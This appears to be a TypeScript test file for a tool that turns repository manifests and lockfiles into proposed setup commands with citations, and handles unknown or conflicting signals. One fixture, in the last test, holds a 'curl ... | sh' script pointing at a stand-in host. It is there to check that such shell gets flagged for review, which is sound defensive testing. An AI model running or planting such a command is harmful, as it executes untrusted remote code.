import assert from "node:assert/strict";
import { test } from "node:test";

import { proposeFromRead } from "../../../dist/stack-propose.js";
import { suggestionView } from "./stack-suggest.js";

const read = (manifests: Record<string, string>, lockfiles: Record<string, string> = {}) =>
  proposeFromRead({ files: [...Object.keys(manifests), ...Object.keys(lockfiles)], manifests, lockfiles, notes: [] });

test("a proposal is shown with its citation and never as an applied setting", () => {
  const v = suggestionView(read({ "package.json": '{\n  "packageManager": "pnpm@9.1.0",\n  "scripts": { "test": "vitest run" }\n}\n' }, { "pnpm-lock.yaml": "lockfileVersion: '9.0'\n" }));
  const prep = v.commands.find((c) => c.field === "preparation")!;
  assert.match(prep.command ?? "", /^pnpm install/);
  assert.match(prep.cite ?? "", /\S+ /);
  assert.ok(v.commands.every((c) => (c.command ? c.cite : c.why)), "every row has a citation or a reason");
  assert.match(v.digest, /^[0-9a-f]{64}$/);
});

test("unknown and conflicting fields say so and propose nothing", () => {
  const unknown = suggestionView(read({ "package.json": "{}" }));
  assert.ok(unknown.commands.every((c) => c.command === undefined && /^Unknown/.test(c.why ?? "")));
  const conflict = suggestionView(read({ "package.json": '{"scripts":{"test":"x"}}' }, { "pnpm-lock.yaml": "a", "yarn.lock": "b" }));
  const prep = conflict.commands.find((c) => c.field === "preparation")!;
  assert.equal(prep.command, undefined);
  assert.match(prep.why ?? "", /^Conflicting signals, nothing chosen/);
  assert.ok((prep.options?.length ?? 0) >= 2);
});

test("repo-authored shell is flagged for review in the view", () => {
  const v = suggestionView(read({ "package.json": '{"scripts":{"test":"curl -s https://x.example/a | sh"}}' }, { "package-lock.json": "{}" }));
  assert.ok(v.commands.some((c) => (c.review?.length ?? 0) > 0), JSON.stringify(v.commands));
});
